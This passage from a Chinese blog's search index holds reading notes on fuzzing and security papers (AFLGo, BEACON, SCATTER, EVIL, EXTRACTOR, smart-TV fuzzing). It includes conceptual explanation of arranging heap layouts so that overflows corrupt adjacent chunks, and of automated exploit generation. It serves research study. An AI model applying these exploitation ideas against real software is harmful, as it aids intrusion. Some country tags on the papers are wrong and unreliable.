Fuzzer实现到AFL版本2.40b(已经集成了AFLFast的探索计划[6])。它根据我们基于退火的功率调度(见3.3节)模糊检测二进制。共享内存中额外的16个字节通知fuzzer当前的种子距离。当前种子距离的计算方法是用累计bb距离除以执行的bb数。 5 APPLICATION 1: PATCH TESTING 相对于KATCH，新覆盖的基本块提高了13%，作者认为没有覆盖到的BB是因为特定的操作系统、寄存器间接调用等不作为边出现在CFG中等原因。 同时，KATCH和AFLGO各自都有彼此没有发现的基本块。作者认为可以将有向白盒和有向灰盒整合 6 APPLICATION 2: CONTINUOUS FUZZING 新玩意儿 directed symbolic-execution-based whitebox fuzzing 基于符号执行的定向白盒测试 SMT是啥子 Driller[38]是一个（无定向）模糊器的例子，它集成了AFL灰盒模糊器和Klee白盒模糊器。 ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/aflgo-directed-greybox-fuzzing/","summary":"#定向fuzzing ABSTRACT 背景（问题）：现有灰盒fuzzer不能进行有效的定向fuzz 方法：基于模拟退火的power schedule，可以将更多","title":"AFLGO Directed Greybox Fuzzing"},{"content":"中文译名：通过日志引导的安卓智慧电视漏洞模糊测试 作者：Yousra Aafer 单位：滑铁卢大学 国家： #法国 年份： #2021年 来源： #USENIX会议 关键字： #fuzzing 代码地址： 笔记建立时间： 2023-04-22 14:16\nabstract 开发了一种新的动态模糊方法，其特点是基于日志的动态输入规范推导和反馈收集。我们的解决方案进一步引入了一种新的外部观察者，它可以监测与电视相关的物理症状 (即视觉和听觉)，以检测潜在的身体异常。\nintroduction 静态分析发现“有趣”的定值目标，作者专注于供应商集成到操作系统中的 API 动态分析曹勇即时日志分析技术，推断目标 API 的输入规范并收集执行反馈。 background 操作系统定制化 API 多 操作设备物理状态的 API 运行在高权限环境中 大多数 API 缺乏保护机制 挑战 逆向分析目标接口 对输入标准的逆向 对本地层的 API 描述符的逆向 评估执行反馈——主要是程序肯能不会崩溃，但是设备的物理反应会存在异常 0 Design Overview 4 Fuzzing Target Locator 目的：提取程序中的定制服务 方法：将提取的 api 和 AOSP 模型的 API 比较，AOSP 中没有的就是定制 api 检测系统服务 API java 层 api 可以从相应服务 IBinder 接口的字节码中提取 本机层 api 求助于在底层 Binder IPC 中提取本地函数的接口 也就是说，对于每个本机 API，我们的目标是从本机二进制文件中恢复事务 id、参数、回复数据类型 提取本地函数接口 对这部分不感兴趣，跳过。\n5 Input Generation Through Log-Guidance 过滤与目标 API 无关的日志信息 过滤与输入验证无关的日志信息 提取输入规范 识别目标 api 相关日志信息 采用统计方法，因为目标 API 记录的消息应该包含在执行后获得的所有日志转储中，所以通过在调用目标 API 之前和之后获得的日志转储之间执行一组差异来获得目标消息。 但是这样并不足以去掉所有的非目标信息 为了解决这个问题，我们依靠给定消息在一组目标日志和另一组基线日志上的经验概率来估计它成为目标消息的可能性。直观地说，在目标日志中具有较高经验概率的消息和在基线日志中具有较低经验概率的消息表明它可能是目标消息。 识别输入验证信息 通过字符串分析重建大量的日志消息模板，利用污点分析标记是否和输入验证有关。用这些数据来训练一个分类器。 组件 (A)收集并自动标记来自各种 Android 框架的训练样本 (约57000条消息)。组件 (B)使用训练语料库来训练不同的分类器: 我们利用 word2vec，这是最先进的预测模型，用于学习原始文本中的词嵌入，为每个消息构建特征向量。然后我们用特征向量作为 CNN 的第一层来训练 CNN 分类器。 动态 fuzzer ？作者只是用一个例子展示了效果，但是这里 fuzzer 如何依据 log 去变异的？作者貌似没有提到\n很可惜。这篇论文没有开源代码。\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/android-smarttvs-vulnerability-discovery-via-log-guided-fuzzing/","summary":"中文译名：通过日志引导的安卓智慧电视漏洞模糊测试 作者：Yousra Aafer 单位：滑铁卢大学 国家： #法国 年份： #2021年 来源： #USENIX会议 关","title":"Android SmartTVs Vulnerability Discovery via Log-Guided Fuzzing"},{"content":"中文译名：通过操纵距离引导的模糊测试自动生成堆溢出的可利用堆布局 作者：Bin Zhang 单位：国防科大 国家： #中国 年份： #2023年 来源： #USENIX会议 关键字： #fuzzing #AGE 代码地址：Epeius/Scatter: Automatically Generate Exploitable Memory Layout for HeapOOB-Write Vulnerabilities in Non-Interpreter Software (github.com) （代码没有上传，只有readme） 笔记建立时间： 2023-05-31 09:35\nAbstract heap primitives are leveraged to construnct exploitable states prior efforts only focus on particular program types or programs with dispatcher-loop structures, these are hard for general-purpose programs this paper present scatter, enabling the generation of exploitable heap layouts for heap overflows in generalpurpose programs in a primitive-free manner. Background A heap primitive is a code snippet that invokes one or more heap operations (such as malloc and free), and it is often invoked multiple times with a certain program input. using heap overflows vulnerabilities to achieve control flow hijacking need strict control of heap allocations, which is challenging Existing approaches to constructing exploitable heap layouts can be categorized into two types: modeling-based approaches and fuzzing-based approaches. existing approaches rely on heap primitives that are easy to be utilized in specific programs 关于 A Running Example 的解释 图中的f和m是指free和malloc，代码（listing 1）中有注释。 listing1的漏洞在于可以输入超过申请chunk大小的输入而造成堆溢出。 可利用的堆溢出是指可以从当前chunk溢出到下一个chunk的头，从而修改chunk的属性。 所以简单的poc（论文中给出的0x100个字节的poc）只能造成程序崩溃或者甚至都不会造成程序崩溃。 想要堆溢出就需要构造堆的布局，就是图中右边，也就是输入epoc。epoc精心构造的目的就是让最后代码的45行输入的puredata可以放入堆块A，这样溢出后就可以影响到堆块B的头，甚至C的头也可以。 如果不精细构造的话输入的puredata纵然产生了堆溢出，但是没有影响到其他堆块。\nMethodology input is the source code of target program and the PoC that triggers a heap overflow vulnerability output are ePoCs that construct exploitable heap layouts\nIdentifying Victim Objects indentify the sensitive structures by static analysis sensitive structures: a structure that contains pointers a structure that has no pointers but contains a member that can affect a buffer\u0026rsquo;s access a union structure that contains previous two types of structures and is accessed as its structure type 这步骤是用来识别代码中对sensitive structures的定义（猜测） identify potential victim objects at runtime by dynamic instrumentation (为啥需要动态分析) after recognizing, scatter locates all victim object allocation points by indentifying heap operations that allocate or free memory for the sensitive structures 这部分是识别代码中对sensitive structures的free和maclloc操作 analyze the type for the return of allocation functions 通过分析LLVM IR Pinpointing Critical Input Bytes 这部分用于识别输入中可能影响堆操作的字节\nIdentifying Mutable Operations 这个可变操作应该指的是受输入影响的对操作，这影响可以是执行次数，也可以是执行参数 build LDG（Layout Dependence Graph）：SCATTER firstly utilizes a heap-operation-guided fuzzer to explore different execution paths, and then extracts heap operations and control flow information on each path.（这里咋实现的） SCATTER identifies mutable heap operations by identifying whether the parameters or execution times of the operations change when giving different program inputs. leverages dynamic taint analysis technique to check whether an operation’s parameters can be affected by the input bytes. Mapping to Input Bytes leverages a lightweight “mutate-check” strategy to locate input bytes that can affect mutable heap operations. 先以输入a执行一次程序，收集参数和可变堆操作出现的次数。然后对a进行多次变异，执行程序，检查参数和可变堆操作的次数是否变化。 Modeling Fuzzing-Based Manipulation a. collect a set of victim objects, determine their locations in the heap\nthrough dynamic instrumentation, obtain all victim objects that are alive in heap b. adjust vulnerable object\u0026rsquo;s location according to the victim objects\u0026rsquo; locations through fuzzing, based on the manipulation distance metric\nfor each victim object, we traverse the trace of heap operations to locate all suitable free chunks for placing the vulnerable object and calculate the manipulation distances. the suitable free chunks following requirements: (1) it is freed before allocating ov and has the same size with ov; (2) ov can overflow into os when ov is placed into this free chunk. Defining Basic Manipulation Distance distance is based on the heap operation a. the position of free chunk c in the free list nA and nF denote the number of allocation and the number of free operations with the same size of c in ⃗ Ro, respectively. (heap operations ⃗ Ro between c’s free and ov’s allocation) ζ{0,1} = 0 if c’s free list is FIFO, otherwise, ζ{0,1} = 1 for FILO. δ represents the position index (start from 1) of c in the free list according to the allocation order. b. basic manipulation distance (to corrupt a victim object os by placing the vulnerable object ov into a free chunk c) (这把上面的式子代入不是0吗？啥意思)\nHandling Early Occupation Problem occupation problem means our target chunk c will be not free when we allocate the vulnerable object the smaller overload factor is, the less likely occupation problem is to occur combine the overload factor and Basic Manipulation Distance, the extended manipulation distance d is : Handling Split-Merge Mechanism this part don\u0026rsquo;t change the equation of distance, author build a model for the $n_A$ and $n_F$ based on the different situation of chunk split and merge.\nManipulation Distance-Guided Fuzzing extract the heap operation trace, the vulnerable object, and all alive victim objects when the overflow occurs For each SCATTER calculates the distance to corrupt it. By iteratively reducing the distance to 0, SCATTER generates the final ePoCs. two challenge how to determine a mutated PoC triggers the same vulnerability as the initial PoC does\nFor two PoCs, if their vulnerable objects’ allocation points and overwriting points from the ASAN’s reports are same, we regard them as triggering the same heap overflow. which PoCs deserve higher priorities to fuzz and how much mutation energy should be assigned?\nSCATTER is based on genetic algorithms and selects the seeds according to the following criteria: Shorter distance More victim objects More free chunks Diverse heap operation sequences The priorities for the criteria are (from high to low): shorter distance, more victim objects, more free chunks and diverse heap operation sequences. base on these criteria, author set a expansion factor to adjust the mutation energy obtained by coverage-based fuzzing Evaluation ePOC Generation 总体上看起来这个sensitive struct的识别率不是很高 疑问：sensitive struct总数是哪里来的，和identify的有啥区别 the author believe that the reasons of failed cases are\nLimited number of victim objects Limited heap operations Limited explored paths the heap operations on the explored pathes are unable to adjust the location of the vulnerable object complex path constraints. Running Failure Comparison with State-of-the-Art AFLcrash意识是AFL的崩溃测试模式 AFLcrit是给AFL喂SCATTER识别的关键字节 SCAg是用Gollum’s distance SCA*是用AFL的能量分配策略 Time Consumption 总之就是它快\nLimitation Other General Heap Managers Customized Heap Managers Multi-threads. Summary by myself explored path是啥 结合Case Study回顾一下\n目的： 方法： 意义： 效果：\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/automated-exploitable-heap-layout-generation-for-heap-overflows-through-manipulation-distance-guided-fuzzing/","summary":"中文译名：通过操纵距离引导的模糊测试自动生成堆溢出的可利用堆布局 作者：Bin Zhang 单位：国防科大 国家： #中国 年份： #2023年 来源： #USENI","title":"Automated Exploitable Heap Layout Generation for Heap Overflows Through Manipulation Distance-Guided Fuzzing"},{"content":"中文译名：利用 LSTM 和专家系统从漏洞报告中自动提取软件名称 作者：Igor Khokhlov 单位：圣心大学 国家： #意大利 年份： #2022年 来源： #IEEE_STC 关键字： #提取信息 代码地址： 笔记建立时间： 2023-05-15 10:20\nAbstract proposes a machine learning method to extract software product names and version from unstructured CVE descriptions automatically create context-aware features by using Word2Vec and Char2Vec use this features to train a NER model using LSTM based on the previously published CVE descriptions, author create a set of Expert System (ES) rules to refine the predictions of the NER model and improve the preformance of the developed method. METHODOLOGY use two major models: NER model and ES model\nNER model is responsible for classify each word within the description as software name (SN), software version (SV), other (O) ES model is responsible for verify the result of NER model NER ES and Rules author examined the dataset and found that 61.5% of all SN in the dataset occurs within the first ten words in the sentence and almost 91% of all SN lies within the first 30 words of the sentence. almost 73% of all SV lies no further than five words from the related SN, and almost 90% within ten words proximity. Software Name Extraction Rules The word is classified as NNP and within 40 words range from the sentence beginning and does not belong to an article and is in the CPE dictionary. This rule is based on the training dataset analysis (see Table I). 2) The word is between two SNs. The word is between two SNs. Software Version Extraction Rules It contains digits and is not further than 30 words from the last SN. This rule is based on the training dataset analysis It is in the list of trigger words and is not further than 30 words from the last SN It contains digits, and the previous word is classified as an SV This word is “and” or “or” and is between two SVs. 目的： 方法： 意义： 效果：\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/automated-extraction-of-software-names-from-vulnerability-reports-using-lstm-and-expert-system/","summary":"中文译名：利用 LSTM 和专家系统从漏洞报告中自动提取软件名称 作者：Igor Khokhlov 单位：圣心大学 国家： #意大利 年份： #2022年 来源： #IEEE_STC 关键字： #提取信","title":"Automated Extraction of Software Names from Vulnerability Reports using LSTM and Expert System"},{"content":"中文译名：信标: 具有可证明路径剪枝的定向灰盒模糊测试 作者：Huang Heqing 单位：香港科技大学 国家： #中国 年份： #2022年\n来源： #SP 关键字： #定向fuzzing 代码地址： https://hub.docker.com/r/yguoaz/beacon 笔记建立时间： 2023-05-09 17:27\n摘要 当前的定向 fuzzer 不够高效，因为它们符号化或者具体的执行了很多不会到达 target code 到的 path，浪费了很多计算资源 beacon——通过一种可证明的方式在路径之海中引导灰盒模糊测试 轻量级的静态分析——用于计算到达目标的先决条件——用于修剪无法到达 target 的路径 引言 传统模糊测试应用于 检测漏洞路径 生成潜在漏洞的 poc 崩溃复现 追踪信息流 定向 fuzzing 现状 定向白盒模糊器依靠符号执行，通过求解路径约束来确定可达性，旨在为生成能够到达目标的输入提供理论保证。因此，它们对符号执行的固有使用从根本上限制了它们的扩展能力。 定向灰盒模糊器通常不考虑拒绝不可达路径。它们依靠从执行反馈中收集的启发式方法，根据到达目标代码的可能性对种子进行优先排序。他们要么使用轻量级的元启发式，例如，到目标的距离，要么使用机器学习技术来预测可达性，但不能保证这种优先级会导致拒绝任何不可行的路径。因此，在 AFLGo 中提到的24小时实验中，95%以上的输入无法到达给定的程序点。 定向 fuzzing 的关键在于尽可能早的剔除不能到达 target 的执行路径 BEACON 耗费低的静态分析计算程序变量的合理近似值，这些值用于决定某条路径是否可以到达 target 为了使得静态分析精确又高效，采用了两种新的优化方法：关系保持和有界析取 基于此对模糊测试中要执行的路径进行修剪（作者称可以达到 80%以上的修剪） 在路径遇到控制流图上不能到达目标的指令时，直接对路径进行剪枝 可到达目标但路径条件不满足的路径进行剪枝 提高： BEACON 平均可以早期拒绝82.94%的路径 与传统的定向模糊器相比，速度提高了11.50倍 对于 AFL、afl++和 Mopt 等 fuzzers, BEACON 可以分别加速6.31倍、11.86倍和10.92倍来重现目标 bug BEACON 发现了14个不完整的修复和8个新 bug 概述 输入为程序源代码和模糊测试目标 首先进行可达性分析，剔除无法到达任何目标的路径 进行反向区间分析 因为选择了区间域作为先决条件的抽象，损失了精确度，所以采用以下两种优化方法 关系保持——保留计算式类的约束条件 边界提取——设定阈值，超过阈值才合并路径 有选择性的插桩 在 BEACON 中，我们检测两种语句: 变量定义语句和分支语句 插桩用于修剪路径 方法 预备工作 作者给出了一个语言简化表示的语法 转换规则 Backward Interval Analysis 以图二为例，用该算法进行分析，从 18 行开始向上反向分析，初始的后置条件是 true，当分析到第 9 行时，碰到了第一个分支, 此时的先验条件分裂为两条，分别是： 在实际分析中可能会分裂为许多条，进行求解非常复杂，同时还需要在 18 行进行合并，还会丢失一定的精度。 为了提高效率，我们建议使用区间抽象来支持路径条件的轻量级推理和反向路径的合理过度逼近。（算法 7-18 行） 经过合并后的 pc 1 和 pc 2 如下图： 综上，我们可以看到后向间隔分析负责得到一个合理逼近的 target 的先验条件\nOptimizations for Maintaining Precision Relationship Preservation 我们设计了如图5所示的推断规则来执行间隔抽象。 与传统的区间分析不同，我们的分析不仅跟踪变量的区间，还跟踪路径条件中出现的表达式。 使用这些规则来分析 pc 2，与传统的分析的区别如下图所示 可以看到分析结果要比传统的区间分析精度更高。 Bounded Disjunctions 当路径数量小于阈值的时候，不进行合并，保留了精度 当路径大于阈值的时候，就需要合并，合并就意味着要丢失精度， 上图的 AB 合并，就会损失中间部分的精度，下面 AB 合并不会有精度损失 依照上述公式进行计算损失，哪个合并损失少，就合并哪两个路径 例子 Precondition Instrumentation 我们首先将程序转换为 SSA 形式[42]，并且只考虑变量定义作为插装的候选程序位置。这是正确的，因为 SSA 表单保证变量在定义之后不会被写入。 当变量 v1的值仅依赖于另一个变量 v2时，不应该检测 v1。这些信息可以通过定义数据流分析来计算[43]。例如，在图2中，v 仅依赖于 u 而不是 x 或 z。 评价 实现 基于LLVM实现执行先决条件分析、检查先决条件的检测和其他与覆盖率相关的检测，输出可执行的二进制文件 使用AFLGo作为模糊测试引擎 Compared to the State of the Art 和AFLGo比较 BEACON分别在Binutils、Ming和Lrzip中检测到3个、9个和2个不完整的补丁，以及8个额外的bug，而AFLGo只检测到6个不完整的补丁。 对于那些可在AFLGo中重现的漏洞，BEACON需要较少的覆盖率 (平均91.2%) 在某些场景下，特别是在AFLGo无法重现漏洞的情况下，BEACON可以实现更高的覆盖率。 和Hawkeye比较 BEACON对所有漏洞的再现均优于AFLGo和Hawkeye，且p值均小于0.05。特别是对于CVE-2016-4491和CVE-20166131, BEACON相比Hawkeye可以实现3.6倍和5.7倍的加速。 和AFL, AFL++, and Mopt比较 与原始工具相比，AFL+BEACON AFL++ BEACON和Mopt+BEACON分别可以实现6.31倍、11.86倍和10.92倍的加速。 路径切片的影响与前提条件检查 在重现漏洞方面，BEACON比BEACON*要快得多 (1.1倍到18.4倍)，因为它平均比BEACON多修剪29.1%的路径。在某些情况下 (例如，CVE-2017-8397)， BEACON *甚至无法在120小时内重现漏洞。这一结果证明了前置条件分析的重要性和必要性，使我们的性能得到了显著的提高。 关系保持与有界析取的影响 在重现漏洞时，BEACON比BEACON-rp和BEACON-bd分别快得多 (1.05倍到4.9倍，1.05倍到5.34倍)。这一结果证明了这两种策略的重要性和必要性，因为它们都有助于前提条件分析的精度，它们的组合可以使我们在模糊测试中获得更高的精度并修剪更多的路径。 当绑定阈值从5增加到50时，执行过滤率从0.9%略微提高到3.2%。然而，时间成本急剧增加，甚至耗尽了服务器内存。因此，BEACON使用5作为阈值，以获得效率和有效性的最佳点。\n插桩开销 其中显示了每个程序的执行次数 (Nexec)、原始时间成本 (Torig)和插装后的时间成本 (TBeacon)。我们观察到，BEACON引入了高达9.8%的运行时开销，平均为5.7%。我们认为这样低的开销在实践中是可以接受的，并且之前的评估表明BEACON比现有的模糊器要快得多。\n相关工作 定向白盒fuzzing Klee[49]，以生成可利用的输入，用于漏洞复现 然而，路径爆炸问题和众所周知的昂贵约束求解使得它们难以扩展到现实世界的程序中。 现有的工作试图利用对漏洞的先验知识，使符号执行专注于相关的程序状态。一个方向是优先考虑程序路径，以供符号执行探索。例如，Hercules[50]使用了一个不健全的函数摘要来确定可达路径的优先级。其他人要么依赖bug报告[51]、关键系统调用[10]，要么依赖补丁中的变化[52]来识别潜在的bug踪迹。然而，这些工作通常需要手工专业知识来确保这些先验知识的质量，这可能导致不同程序的不同表现。另一个方向是加速符号执行本身，以便更快地接近目标。例如，现有的作品通过快照机制象征性地[53]或具体地[54]保留执行状态，以避免冗余的路径探索。Chopper[55]采用在线静态分析来提供状态合并策略，同时最小化动态分析路径的数量。DiSE[56]识别分支条件之间的关系，并逐步解决它们。 覆盖引导fuzzing 可以通过动态污染分析来优化输入生成。其基本思想是改变相关的输入偏移量以满足未覆盖的分支条件。 Angora[57]采用字节级污染跟踪来发现目标条件的相关输入字节，然后应用基于梯度下降的搜索策略。 为了使基于梯度下降的搜索更加合理，Neuzz[58]提出使用神经网络平滑搜索过程。 还有一些技术涉及轻量级程序分析和转换，以提高突变的有效性。Fairfuzz[59]识别了不需要改变值的输入偏移量，因此，最小化输入搜索空间提高了突变的效率。Mopt[13]提出了一种新的突变算子调度策略来调整不同程序的突变策略。 将模糊器与集合/符号执行相结合，即混合模糊，用于解决复杂和严格的路径约束。 Driller[60]提出解决那些未发现的路径进行模糊化，而不是用集合执行来探索所有路径。然而，如何有效地将协同执行与模糊测试相结合一直是人们关注的问题。 QSYM[61]解决了基种子的部分路径约束，并对满足实际条件的验证输入利用了突变。 Intriguer[62]进一步用动态污染分析取代符号仿真，这减少了建模大量类移动指令的开销。 Pangolin[63]建议将约束保留为抽象，并重用它来指导进一步的输入生成。 ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/beacon-directed-grey-box-fuzzing-with-provable-path-pruning/","summary":"中文译名：信标: 具有可证明路径剪枝的定向灰盒模糊测试 作者：Huang Heqing 单位：香港科技大学 国家： #中国 年份： #2022年 来源： #SP 关键字： #定向","title":"BEACON Directed Grey-Box Fuzzing with Provable Path Pruning"},{"content":"中文译名：evil: 利用自然语言开发软件 作者：Pietro Liguori 单位：那不勒斯费德瑞科二世大学 国家： #意大利 年份： #2021年 来源： #IEEE_ISSRE_CCFB 关键字： #NLP_AGE 代码地址：dessertlab/EVIL: EVIL (Exploiting software VIa natural Language) is an approach to automatically generate software exploits in assembly/Python language from descriptions in natural language. The approach leverages Neural Machine Translation (NMT) techniques and a dataset that we developed for this work. (github.com) 笔记建立时间： 2023-05-15 22:29 这篇论文幸好是21年，要是今年发就惨了\nABSTRACT EVIL can automatically generate exploits in assembly/python language from descriptions in natural language. EVIL leverages Neural Machine Translation techniques and a dataset that author developed. METHODLOGY pre-processing tokenization standardization: prevent non-English tokens from getting transformed during learning process intent parser: input natural language (intent), output a dictionary of standardizable tokens such as specific values, label names, and parameters Standardizer: input is the output of the intent parser and replace the selected token in both intent adn snippet. just like the step 3 and 4 in figure 1 embedding NMT models Seq2Seq bi-directional LSTM as the encoder CodeBERT Post-Processing it is a inverse operation of standardization, it replaces the symbolic value with the real value 虽然能把自然语言转换成代码，但是需要的自然语言的描述及其详细\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/evil-exploiting-software-via-natural-language/","summary":"中文译名：evil: 利用自然语言开发软件 作者：Pietro Liguori 单位：那不勒斯费德瑞科二世大学 国家： #意大利 年份： #2021年 来源： #IEEE_ISSRE_CCFB 关键字： #NLP_AGE","title":"EVIL Exploiting Software via Natural Language"},{"content":"中文译名：提取器: 从威胁报表中提取攻击行为 作者：Kiavash Satvat 单位：伊利诺伊大学芝加哥分校 国家： #美国 年份： #2021年 来源： #SP 关键字： #提取信息 代码地址： https://github.com/ksatvat/Extractor 笔记建立时间： 2023-04-13 17:43\n摘要 提出 EXTRACTOR，可以从 CTI 报告（Cyber Threat Intelligence reports）中精确提取简洁的攻击行为 可以提取非结构化文本，对文本没有要求 1. Introduction 挑战 冗长：威胁报告中充斥着大量无关文本。 CTI 报告的句法和语义复杂性、技术术语的普遍使用以及缺乏适当的标点符号很容易影响报告的解释和攻击行为的提取。 难以准确地解释技术报告中的复杂逻辑。 目标 除了解决上面的挑战，作者还想实现两个目标：\n可操作的情报：EXTRACTOR 从文本中提取的攻击行为必须能在系统审计日志中被观察到，并能有效地用于威胁检测。不需要人员或工具的进一步处理 准确处理大量 CTI 报告。 自动挖掘更大的知识源（能够处理不同的文本） 从 CTI 报告中构建图表表示 从与不同组织中的同一攻击相关的各种 CTI 源提取信息 2. 问题和背景 问题描述 （实现效果） 报告 (左图)是 njRAT的自由改编，删除了不相关的句子。这个例子展示了语言的复杂性，这将在本文中讨论。在相应的来源图中 (右侧)，节点表示系统实体，边指向系统调用。矩形、椭圆形、五边形和菱形分别表示文件、进程、注册表和套接字。\n挑战 冗余 CTI 文本的复杂性 缺少标点符号——NLP 工具难以分辨句子边界 专业单词——NLP 工具是用通用英语来训练的。 省略：CTI 报告中经常出现缺少主语或宾语的情况 不能忽略代词。 复杂的语言结构：结构的复杂性和各种语言技术 (如回指、名词化和列表)的使用可能会混淆常见的 NLP 工具。总的影响是，许多主语、动词和宾语被错误地分类并无法解决。 关系的提取：不能仅仅依赖句子的语法结构，还要分析语义 3. APPROACH EXTRACTOR 有四个主要组成部分:1)归一化，2)resolution，3)摘要，4)图生成。\n规范化负责第一轮的句子简化和转换到标准形式。 Resolution 解决了这些句子中的歧义 摘要删除了与攻击行为不严格相关的部分文本。 最后，图生成负责解决文本中事件之间的时间和因果顺序，并构建最终的起源图 。 实例： A.归一化 目的：生成规范的句子形式——将长而复杂的句子分解成更短的句子，以规范的形式出现。直观的说，每个句子都表达一个单独的动作，这样动作的主体和对象以及动作本身就更容易识别。 操作：规范化由 Tokenization、Homogenization 和 Conversion.组成。这些步骤分别执行句子边界检测、单词同质化和被动到主动动词转换。\nTokenization 目的：划分句子\n使用标点符号、新行、项目符号、枚举数字以及标题和题目作为句子分隔符，将长句子分割为单词序列 如果每个短序列满足以下要求，就升级为一个长句子 以大写的主语开始，包含了构成一个完整句子所必须的所有成分，并且前后序列也是完整句子 以一个动词开始，并且该动词包含在系统调用字典中，序列包含了构成一个完整句子所必须的所有成分，并且前后序列也是完整句子 示例（图 4）： 4-9 是一个长句子, 首先被划分为更短的序列，然后用 POS 和 DP 为其标记。并检查是否满足以上两个条件。 第4行序列满足第一种情况的条件，而第5-9行序列满足第二种情况 (省略主语)的条件。 Homogenization 目的：将同一概念的多个文本表示替换为同一文本表示的过程。\nCTI 报告通常包含可能引入歧义并影响最终结果质量的结构和同义词。例如，C 2、C\u0026amp;C 和 Command and Control 是同一个实体的不同表示，而像 stores、save 这样的动词可能表示对应于写入系统调用的操作。 操作：\n使用两个专门构建的字典对名词短语和动词进行 Homogenization，将 CTI 报告中出现的不同术语的同义词映射到审计日志中可以观察到的实体或操作。 Coversion 目的：EXTRACTOR 将被动语态转换为主动语态。这种转换有助于发现系统主体 (过程)和系统对象，以及使因果关系推断更准确. 操作：\n使用 POS 和 DP 来检测被动句 然后转换主语和实施者，并将被动动词转换为主动动词。 经过归一化的三部分后，长句被转换为短句，并且每个短句都以主动的形式来表达一个动作。\nResolution 这部分主要用于解决句子的歧义，作者原话是“Resolution 将引用同一实体的隐式引用与实际引用进行协调”，我的理解是隐式引用可能存在一些省略的主语导致句子产生歧义，那 Resolution 就需要对主语进行补充，将隐式引用转换为显式引用。\nEllipsis Subject（省略主语） Resolution (ESR) 图四示例中的第 5-9 都是省略主语 目的：找到并补充主语 操作：\n利用 POS 和 DP 找到缺少主语的句子 使用当前句子之前的句子中出现的实体构建一个候选主语列表 计算候选主语和缺少主语的句子之间的距离（以句子数计算），距离越近被选中的概率越高。 示例： 图四的5-9行句子中缺少主语。ESR 模块检测前面句子中的主语和其他宾语，并选择出现在冒号前面的代词作为主语。\nPronoun（代词） Resolution (PR) 目的：代词解析是将代词映射并替换到其所指的先行词实体的过程。 操作：\n采用了一个流行的共指解析模型 NeuralCoref。这个模型在解析 CTI 报表域中的代词时效果最好，特别是在前面的 ESR 和 Tokenization 步骤之后。图4，第4、5和6行演示了已解析的前名词 (即 it 和本身)及其对应的引用 (autoalization .exe)。 Entity Resolution (ER). 实体解析是指在同一句中指代另一个实体的名词或动词短语被该实体替换或作为冗余删除的过程。 （这部分和代词有点像，例如，在图4的第11行中，The following files 指的是 mscno. exe authorization. EXE-0AD199D6. pf。这部分就是要把 The following files 换成具体的实体名） 这类词主要有三类：Anaphora（指代），Nominalization（名词化），auxiliary verb（助动词）\n在 Resolution 模块过后，此时的文本由具有明确主语、宾语和动词的句子组成。\ntext summarization 目的：对审计报告中没有出现的内容进行删除，也就是说作者希望能够对文本更近一步的进行处理，不是简单的剔除非技术内容。 操作：\n使用 bert 模型将句子分为生产性和非生产性 使用 BiLSTM 推导生产性句子组件的语义角色，并删除不必要的单词 为了避免删除可能包含重要对象的句子组件，使得删除更加精确，使用系统实体提取器——如果一个被标记为需要删除的句子组成部分不包含 SEE 组件规则可以生成的任何实体，则该组成部分将被删除。 text summarization 是 EXTRACTOR 的核心组件之一。它负责大大降低文本的复杂性和数量，同时保留描述可观察行为的最重要的句子。 最后输出的文本形式是：系统主体 (例如，进程)、对象 (例如，文件、套接字)和操作 (例如，执行)。文本是明确的、有序的，并且大部分多余的文本被消除了\ngraph extraction 但是只是简单的将主语和对象设置为图中结点，动词设置为图中的边生成的图模糊且巨大。\nSemantic Role Labeling SRL SRL 可以从句子中提取角色，并且理解哪个是动作实施者，哪个是接受者。\n系统实体提取器 (SEE) SEE 模块，从 SRL 生成的角色中提取代表系统实体的简洁节点，并修剪掉不能构成可能的系统实体的无用部分。 SEE 使用超过 32 种不同的正则表达式和应用程序名称或知名进程的数据库检测可能的系统实体名称 (例如，文件或进程名称，IP，注册表项)。\ngraph builder GB 分两个步骤，第一步就是根据 see 修剪后剩下的文本，将主语作为结点，动作作为边构建图。 第二步就是基于因果推论来确定边的方向。\n因果推论 Causal Inference 这步用于确定图中边的方向。根据系统调用到系统流方向的映射。啥意思，就是看这个系统调用是干嘛的，比如对于发送系统调用，流从主语到对象，而对于接收系统调用，流从对象到主语。\n4. IMPLEMENTATION Tokenization 建立在 NLTK 句子标记器之上。NLTK (自然语言工具包)是一个常见的自然语言处理工具包，包含为英语开发的几个库和统计自然语言处理。我们选择 NLTK 是因为我们发现它比其他方法 (spaCy, Stanford)效果更好，并且在处理 CTI 域中的文本时更加一致。\nText Summarization 使用了一个12 个隐藏层 BERT 来区分生产性句子和非生产性句子。使用了8000个标记句子，训练模型。 为了理解单词在文本摘要器中的角色，使用了一个深度 BiLSTM 模型的重新实现。由于模型没有经过微调以处理网络安全句子，我们使用3,000个手动标记的句子来训练模型。\nSRL 为了实现 SRL，我们使用了[79]中描述的方法，该方法由[34]部署，该方法在 NLP 领域越来越流行。为了采用该系统并在网络安全领域获得更精确的输出，我们进一步用2000个网络安全句子重新训练模型，这些句子与我们注意到系统无法正确预测角色的领域相关。为了进一步完善，我们评估并展示了我们再培训的结果 (见章节 V-D)。\n数据构建 为了构建字典和我们的数据集，我们使用了从各种来源抓取的 CTI 报告池。我们使用了不同的来源，即 APT 报告存储库[6]、微软威胁中心[8]、赛门铁克安全中心[16]、威胁百科全书[18]和病毒雷达[20]，以确保多样性和覆盖范围。\n注意 先前的研究[52]，[45]，[89]利用各种 NLP 技术以 IOCs (即[52]，[89])和威胁行动 (即[45])的形式自动提取 CTI 